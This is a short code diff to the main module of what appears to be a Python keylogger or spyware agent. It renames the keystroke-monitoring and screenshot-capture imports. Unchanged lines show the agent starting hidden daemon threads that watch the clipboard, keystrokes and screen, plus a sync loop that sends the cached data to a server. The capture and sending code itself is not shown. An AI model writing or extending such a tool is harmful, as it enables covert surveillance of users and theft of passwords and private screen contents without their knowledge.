@@ -10,8 +10,8 @@ import threading
 from utils import log
 from cache import ensure_cache_directory
 from clipboard import start_clipboard_monitoring
-from keystrokes import start_keystroke_monitoring
-from screenshots import start_screenshot_monitoring
+from keystrokes import start_keystrokes_monitoring
+from screenshots import start_screenshots_capture
 from sender import server_is_online, send_cached_data
 
 
@@ -30,8 +30,8 @@ def main():
 
     # Start all monitoring modules in separate threads
     threading.Thread(target=start_clipboard_monitoring, daemon=True).start()
-    threading.Thread(target=start_keystroke_monitoring, daemon=True).start()
-    threading.Thread(target=start_screenshot_monitoring, daemon=True).start()
+    threading.Thread(target=start_keystrokes_monitoring, daemon=True).start()
+    threading.Thread(target=start_screenshots_capture, daemon=True).start()
 
     # Start cache sync thread
     threading.Thread(target=cache_sync_loop, daemon=True).start()
